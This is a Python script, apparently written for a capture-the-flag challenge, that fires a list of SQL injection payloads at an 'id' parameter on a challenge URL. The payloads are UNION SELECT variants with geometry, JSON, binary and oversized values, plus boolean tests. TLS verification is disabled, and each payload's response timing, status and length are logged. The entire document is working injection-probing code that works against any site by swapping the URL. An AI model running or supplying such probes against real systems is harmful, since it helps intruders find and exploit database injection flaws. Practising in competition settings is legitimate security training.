import requests
import time
import urllib3

urllib3.disable_warnings()

s = requests.Session()
s.verify = False
url = "https://04a2b0dcb17c2e99.chal.ctf.ae/"

payloads = [
    # Basic UNIONs
    "1 UNION SELECT 1",
    "-1 UNION SELECT 1",
    "0 UNION SELECT 1",
    "1 UNION SELECT NULL",
    "-1 UNION SELECT NULL",
    # Geometry
    "-1 UNION SELECT ST_GeomFromText('POINT(1 1)')",
    "-1 UNION SELECT POINT(1,1)",
    "-1 UNION SELECT LINESTRING(POINT(1,1), POINT(2,2))",
    "-1 UNION SELECT POLYGON(LINESTRING(POINT(0,0),POINT(0,1),POINT(1,1),POINT(0,0)))",
    # JSON
    "-1 UNION SELECT JSON_ARRAY(1,2,3)",
    "-1 UNION SELECT JSON_OBJECT('k','v')",
    # Big data / Overflow
    "-1 UNION SELECT REPEAT('A', 1000000)",
    "-1 UNION SELECT REPEAT('A', 10000000)",
    "-1 UNION SELECT 0x00",
    "-1 UNION SELECT 0xff",
    # Bit / Binary
    "-1 UNION SELECT b'101010'",
    # Subqueries / Errors
    "1 AND 1=0",
    "1 AND 1=1",
]

for p in payloads:
    t0 = time.time()
    try:
        r = s.get(url, params={"id": p}, timeout=10)
        dur = round(time.time() - t0, 2)
        print(f"[{dur}s] code={r.status_code} len={len(r.content)}: {p}")
    except Exception as e:
        dur = round(time.time() - t0, 2)
        print(f"[{dur}s] EXCEPTION: {e} : {p}")
